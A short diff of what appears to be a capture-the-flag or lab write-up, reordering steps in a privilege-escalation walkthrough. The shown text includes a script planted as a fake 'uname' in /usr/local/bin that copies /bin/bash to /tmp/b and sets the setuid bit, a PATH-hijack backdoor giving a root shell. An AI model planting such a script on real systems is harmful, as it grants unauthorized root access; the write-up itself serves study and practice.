@@ -104,6 +104,10 @@ find / -name uname 2>/dev/null
 I'll make a new file called uname
 
 ```
+nano /usr/local/bin/uname
+```
+
+```
 #!/bin/bash
 cp /bin/bash /tmp/b
 chmod u+s /tmp/b
@@ -113,7 +117,6 @@ echo "Exploited2"
 Then make it executable and try to login again. 
 
 ```
-nano /usr/local/bin/uname
 chmod +x uname
 ```
 
